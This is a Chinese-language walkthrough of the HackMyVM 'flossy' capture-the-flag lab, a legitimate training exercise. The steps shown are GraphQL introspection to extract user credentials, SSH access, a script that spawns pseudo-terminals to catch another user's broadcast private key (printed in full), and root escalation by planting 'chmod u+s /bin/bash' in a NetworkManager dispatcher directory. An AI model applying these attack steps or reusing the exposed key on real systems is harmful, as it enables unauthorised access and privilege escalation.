# hmv_flossy

# 0.简介

**靶机**：[hackmyvm - flossy](https://hackmyvm.eu/machines/machine.php?vm=flossy)
**难度**：黄色
**目标 IP**：192.168.205.138
**本机 IP**：192.168.205.141

# 1.扫描

`nmap`起手

```bash
┌──(kali㉿kali)-[~/test]
└─$ nmap -sS --min-rate 10000 -p- -Pn 192.168.205.138
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-17 16:18 CST
Nmap scan report for 192.168.205.138
Host is up (0.00026s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:61:56:42 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.43 seconds

```

先看**80端口**，**22端口**候补

# 2.踩点

![Image](https://github.com/user-attachments/assets/b9a4753b-3614-43d8-adff-220881ce04cd)

一个查询页面，可以输入数值进行查询，有效范围是**1-99**，后面的数据是重复的。尝试sql注入

```bash
┌──(kali㉿kali)-[~/test]
└─$ sqlmap -u "http://192.168.205.138" --forms --batch 
        ___
       __H__                                                                                                                         
 ___ ___[.]_____ ___ ___  {1.9#stable}                                                                                                 
|_ -| . [)]     | .'| . |                                                                                                            
|___|_  [.]_|_|_|__,|  _|                                                                                                            
      |_|V...       |_|   https://sqlmap.org                                                                                         

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 16:44:38 /2025-01-17/

[16:44:38] [INFO] testing connection to the target URL
[16:44:38] [INFO] searching for forms
[16:44:38] [CRITICAL] there were no forms found at the given target URL

[*] ending @ 16:44:38 /2025-01-17/

```

不行，尝试特殊符号绕过，无果。扫描架构

```bash
┌──(kali㉿kali)-[~/test]
└─$ nuclei -u http://192.168.205.138               

                     __     _
   ____  __  _______/ /__  (_)
  / __ \/ / / / ___/ / _ \/ /
 / / / / /_/ / /__/ /  __/ /
/_/ /_/\__,_/\___/_/\___/_/   v3.3.8

                projectdiscovery.io

[INF] Current nuclei version: v3.3.8 (latest)
[INF] Current nuclei-templates version: v10.1.1 (latest)
[WRN] Scan results upload to cloud is disabled.
[INF] New templates added in latest release: 154
[INF] Templates loaded for current scan: 7607
[WRN] Loading 182 unsigned templates for scan. Use with caution.
[INF] Executing 7425 signed templates from projectdiscovery/nuclei-templates
[INF] Targets loaded for current scan: 1
[INF] Templates clustered: 1702 (Reduced 1602 Requests)
[INF] Using Interactsh Server: oast.pro
[graphql-field-suggestion] [http] [info] http://192.168.205.138/graphql
[graphql-alias-batching] [http] [info] http://192.168.205.138/graphql
[graphql-detect] [http] [info] http://192.168.205.138/graphql [paths="/graphql"]
[waf-detect:securesphere] [http] [info] http://192.168.205.138
[ssh-password-auth] [javascript] [info] 192.168.205.138:22
[ssh-sha1-hmac-algo] [javascript] [info] 192.168.205.138:22
[ssh-auth-methods] [javascript] [info] 192.168.205.138:22 ["["publickey","password"]"]
[ssh-server-enumeration] [javascript] [info] 192.168.205.138:22 ["SSH-2.0-OpenSSH_9.2p1 Debian-2"]
[CVE-2023-48795] [javascript] [medium] 192.168.205.138:22 ["Vulnerable to Terrapin"]
[openssh-detect] [tcp] [info] 192.168.205.138:22 ["SSH-2.0-OpenSSH_9.2p1 Debian-2"]
[http-missing-security-headers:content-security-policy] [http] [info] http://192.168.205.138
[http-missing-security-headers:permissions-policy] [http] [info] http://192.168.205.138
[http-missing-security-headers:x-frame-options] [http] [info] http://192.168.205.138
[http-missing-security-headers:cross-origin-resource-policy] [http] [info] http://192.168.205.138
[http-missing-security-headers:strict-transport-security] [http] [info] http://192.168.205.138
[http-missing-security-headers:x-content-type-options] [http] [info] http://192.168.205.138
[http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://192.168.205.138
[http-missing-security-headers:referrer-policy] [http] [info] http://192.168.205.138
[http-missing-security-headers:clear-site-data] [http] [info] http://192.168.205.138
[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://192.168.205.138
[http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://192.168.205.138
[tech-detect:express] [http] [info] http://192.168.205.138                                                                       
```

可以看到和**graphql**有关，去[hacktricks](https://book.hacktricks.wiki/)搜索会有一篇[相关的文章](https://book.hacktricks.wiki/zh/network-services-pentesting/pentesting-web/graphql.html)

![Image](https://github.com/user-attachments/assets/3b901b4a-7b70-4115-8e9a-bcef0a17dea1)

进行尝试

![Image](https://github.com/user-attachments/assets/a06c32f3-66b7-473e-a0e7-454b5b7d3c9a)

确实是**GraphQL**服务，进一步测试

```bash
POST /graphql HTTP/1.1
Host: 192.168.205.138
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Referer: http://192.168.205.138/
Content-Type: application/json
Content-Length: 106
Origin: http://192.168.205.138
DNT: 1
Sec-GPC: 1
Connection: keep-alive
Priority: u=0

{"query":"{__schema{types{name,fields{name,args{name,description,type{name,kind,ofType{name, kind}}}}}}}"}
```

![Image](https://github.com/user-attachments/assets/25ee0763-bd8d-4e53-81de-e184768478c5)

存在**用户名**和**密码**，我们尝试提取

```bash
省略
{"query":"{users(id: 1) {username   password }}"}
```

![Image](https://github.com/user-attachments/assets/542a96c5-7747-4a97-8c78-0c4adbb94eab)

拿去爆破模块爆破

![Image](https://github.com/user-attachments/assets/2a021d44-95ea-429a-ac13-351c6317f026)

尝试登录ssh

```bash
┌──(kali㉿kali)-[~/test]
└─$ ssh malo@192.168.205.138                        
The authenticity of host '192.168.205.138 (192.168.205.138)' can't be established.
ED25519 key fingerprint is SHA256:TCA/ssXFaEc0sOJl0lvYyqTVTrCpkF0wQfyj5mJsALc.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.205.138' (ED25519) to the list of known hosts.
malo@192.168.205.138's password: 
Linux flossy 6.1.0-10-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.37-1 (2023-07-03) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
[oh-my-zsh] Would you like to update? [Y/n] n
[oh-my-zsh] You can update manually by running `omz update`

╭─malo@flossy ~ 
╰─$ id
uid=1000(malo) gid=1000(malo) groups=1000(malo),100(users)
```

# 3.提权

```bash
╭─malo@flossy ~ 
╰─$ sudo -l
sudo: unable to resolve host flossy: Name or service not known
[sudo] password for malo: 
Sorry, user malo may not run sudo on flossy.
╭─malo@flossy ~ 
╰─$ ls -la                                                                                                                         1 ↵
total 216
drwxr-xr-x  5 malo malo   4096 Jan 17 10:03 .
drwxr-xr-x  4 root root   4096 Oct  6  2023 ..
-rw-------  1 malo malo      4 Oct  7  2023 .bash_history
-rw-r--r--  1 malo malo    220 Oct  6  2023 .bash_logout
-rw-r--r--  1 malo malo   3526 Oct  6  2023 .bashrc
drwxr-xr-x  3 malo malo   4096 Oct  6  2023 .local
drwxr-xr-x 12 malo malo   4096 Oct  6  2023 .oh-my-zsh
-rw-r--r--  1 malo malo    807 Oct  6  2023 .profile
drwx------  2 malo malo   4096 Oct 10  2023 .ssh
-rw-r--r--  1 malo malo  51798 Jan 17 10:02 .zcompdump-flossy-5.9
-r--r--r--  1 malo malo 119920 Jan 17 10:02 .zcompdump-flossy-5.9.zwc
-rw-------  1 malo malo     63 Jan 17 10:03 .zsh_history
-rw-r--r--  1 malo malo   3890 Oct  6  2023 .zshrc
╭─malo@flossy ~ 
╰─$ cat .bash_history
tty
╭─malo@flossy ~ 
╰─$ cat .zsh_history           
: 1737104526:0;id
: 1737104577:0;sudo -l
: 1737104613:0;ls -la
: 1737104620:0;cat .bash_history
: 1737104635:0;cat .zsh_history
╭─malo@flossy ~ 
╰─$ find / -perm -4000 -type f 2>/dev/null
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/su
/usr/bin/mount
/usr/bin/chfn
/usr/bin/umount
/usr/sbin/pppd
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/polkit-1/polkit-agent-helper-1
╭─malo@flossy ~ 
╰─$ /sbin/getcap -r / 2>/dev/null                                                                                                  1 ↵
/usr/bin/ping cap_net_raw=ep
╭─malo@flossy ~ 
╰─$ ss -tuln | grep tcp
tcp   LISTEN 0      511          0.0.0.0:80        0.0.0.0:*        
tcp   LISTEN 0      128          0.0.0.0:22        0.0.0.0:*        
tcp   LISTEN 0      128             [::]:22           [::]:*        
╭─malo@flossy ~ 
╰─$ cd /home      
╭─malo@flossy /home 
╰─$ ls -la
total 16
drwxr-xr-x  4 root   root   4096 Oct  6  2023 .
drwxr-xr-x 18 root   root   4096 Jul 22  2023 ..
drwxr-xr-x  5 malo   malo   4096 Jan 17 10:06 malo
drwxr-xr-x  5 sophie sophie 4096 Oct 10  2023 sophie
╭─malo@flossy /home 
╰─$ cd sophie 
╭─malo@flossy /home/sophie 
╰─$ ls -al
total 56
drwxr-xr-x  5 sophie sophie 4096 Oct 10  2023 .
drwxr-xr-x  4 root   root   4096 Oct  6  2023 ..
-rw-------  1 root   root    370 Oct 10  2023 .bash_history
-rw-r--r--  1 sophie sophie  220 Oct  6  2023 .bash_logout
-rw-r--r--  1 sophie sophie 3526 Oct  6  2023 .bashrc
drwxr-xr-x  3 sophie sophie 4096 Oct  6  2023 .local
-rwxr-----  1 root   sophie  962 Oct  6  2023 network
drwxr-xr-x 12 sophie sophie 4096 Oct  6  2023 .oh-my-zsh
-rw-r--r--  1 sophie sophie  807 Oct  6  2023 .profile
-rw-r--r--  1 sophie sophie   66 Oct  7  2023 .selected_editor
drwx------  2 sophie sophie 4096 Oct 10  2023 .ssh
-rwxr-xr-x  1 sophie sophie  630 Oct 10  2023 SSHKeySync
-rwx------  1 sophie sophie   33 Oct 10  2023 user.txt
-rw-r--r--  1 sophie sophie 3890 Oct  6  2023 .zshrc
╭─malo@flossy /home/sophie 
╰─$ cat SSHKeySync
#!/bin/bash

# This script must run every minute in pre-prod

send_private_key() {
    local user_name="$1"
    local key_path="/home/$user_name/.ssh/id_rsa"
    local admin_tty="/dev/pts/24"

    if [ -f "$key_path" ]; then
        if [ -w "$admin_tty" ]; then
            cat "$key_path" > "$admin_tty"
        else
            echo "Error: Unable to write to $admin_tty"
        fi
    else
        echo "Error: The private key for $user_name doesn't exist."
    fi
}

while true ; do
  USER="sophie"
  echo "Sending $USER's private key to a high-privileged TTY for quick testing..."
  send_private_key "$USER"
  sleep 1m
done
╭─malo@flossy /home/sophie 
╰─$ tty
/dev/pts/0
```

脚本的实现了每分钟将**sophie**的私钥发送到`/dev/pts/24`中，我们尝试利用

```bash
╭─malo@flossy /home/sophie 
╰─$ ls /dev/pts/                                                                                                                   2 ↵

0  ptmx
╭─malo@flossy /home/sophie 
╰─$ script /dev/null
Script started, output log file is '/dev/null'.
╭─malo@flossy /home/sophie 
╰─$ ls /dev/pts/  

0  1  ptmx
╭─malo@flossy /tmp 
╰─$ cat a.sh
#!/bin/bash

for i in {1..27}
do
    script /dev/pts/$i &
done
╭─malo@flossy /tmp 
╰─$ chmod +x a.sh 
╭─malo@flossy /tmp 
╰─$ bash a.sh 

省略

-----BEGIN OPENSSH PRIVATE KEY-----
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\=\=
-----END OPENSSH PRIVATE KEY-----
```

将密钥写入`id_rsa`中，连接ssh（**建议重新开个kali窗口进行连接，不然它一直弹私钥挺烦的**）

```bash
┌──(kali㉿kali)-[~/test/tmp]
└─$ ssh sophie@127.0.0.1 -i id_rsa 
The authenticity of host '127.0.0.1 (127.0.0.1)' can't be established.
ED25519 key fingerprint is SHA256:TCA/ssXFaEc0sOJl0lvYyqTVTrCpkF0wQfyj5mJsALc.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '127.0.0.1' (ED25519) to the list of known hosts.
Linux flossy 6.1.0-10-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.37-1 (2023-07-03) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
[oh-my-zsh] Would you like to update? [Y/n] n
[oh-my-zsh] You can update manually by running `omz update`
╭─sophie@flossy ~ 
╰─$ id
uid=1001(sophie) gid=1001(sophie) groups=1001(sophie),100(users)
```

继续进行提权

```bash
╭─sophie@flossy ~ 
╰─$ sudo -l
sudo: unable to resolve host flossy: Name or service not known
Matching Defaults entries for sophie on flossy:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User sophie may run the following commands on flossy:
    (ALL : ALL) NOPASSWD: /home/sophie/network*
╭─sophie@flossy ~ 
╰─$ cat network           
#!/bin/bash


connected_ip(){
        connection_type=TCP
        champ=2
        ignores=LISTEN
        lsof_args=-ni

        port_local="[0-9][0-9][0-9][0-9][0-9]->"

        lsof "$lsof_args" | grep $connection_type | grep -v "$ignores" |
        awk '{print $9}' | cut -d : -f $champ | sort | uniq |
        sed s/"^$port_local"//
 }

dispatcher() {
    for s in /opt/*; do
        if [ -f "$s" ]; then
            d="/etc/NetworkManager/dispatcher.d/$(basename $s)"
            if [ ! -f "$d" ] || [ "$s" -nt "$d" ]; then
                return 0
            fi
        fi
    done
    return 1
}

update() {
    if [[ -z $(find /opt -type f) ]] ; then
      exit 0
    else
      echo "Updating scripts."
      cp /opt/* /etc/NetworkManager/dispatcher.d/
      chmod +x /etc/NetworkManager/dispatcher.d/*
      echo "Scripts updated."
    fi
}



case "${1}" in
ip)   connected_ip ;;
disp) dispatcher ; update ;;
*)    echo "Usage: ./$0 option" ;;
esac
```

这个脚本只用关注它会把`/opt/`中的所有文件复制到`/etc/NetworkManager/dispatcher.d/`并给予执行权限。尝试**恶意代码注入**

```bash
╭─sophie@flossy /opt
╰─\$ echo 'chmod u+s /bin/bash' > a.sh
╭─sophie@flossy /opt 
╰─$ chmod +x a.sh
╭─sophie@flossy /opt 
╰─$ sudo /home/sophie/network disp 
sudo: unable to resolve host flossy: Name or service not known
Updating scripts.
Scripts updated.
╭─sophie@flossy /opt 
╰─$ ls -la /etc/NetworkManager/dispatcher.d/
total 3468
drwxr-xr-x 5 root root    4096 Jan 17 10:44 .
drwxr-xr-x 7 root root    4096 Oct  6  2023 ..
-rwxr-xr-x 1 root root    2293 Mar  9  2023 01-ifupdown
-rwxr-xr-x 1 root root      20 Jan 17 10:44 a.sh
drwxr-xr-x 2 root root    4096 Mar  9  2023 no-wait.d
drwxr-xr-x 2 root root    4096 Mar  9  2023 pre-down.d
drwxr-xr-x 2 root root    4096 Mar  9  2023 pre-up.d
-rwxr-xr-x 1 root root 3518724 Jan 17 10:44 pspy
╭─sophie@flossy /opt 
╰─$ cd /etc/NetworkManager/dispatcher.d/          
╭─sophie@flossy /etc/NetworkManager/dispatcher.d 
╰─$ nmcli connection up lo
Connection successfully activated (D-Bus active path: /org/freedesktop/NetworkManager/ActiveConnection/2)
╭─sophie@flossy /etc/NetworkManager/dispatcher.d 
╰─$ ls -la /bin/bash                  
-rwsr-xr-x 1 root root 1265648 Apr 23  2023 /bin/bash
╭─sophie@flossy /etc/NetworkManager/dispatcher.d 
╰─$ bash -p                                 
bash-5.2# id
uid=1001(sophie) gid=1001(sophie) euid=0(root) groups=1001(sophie),100(users)
```

![Image](https://github.com/user-attachments/assets/6adbe1c8-e9d6-4394-a24d-345116fda9f7)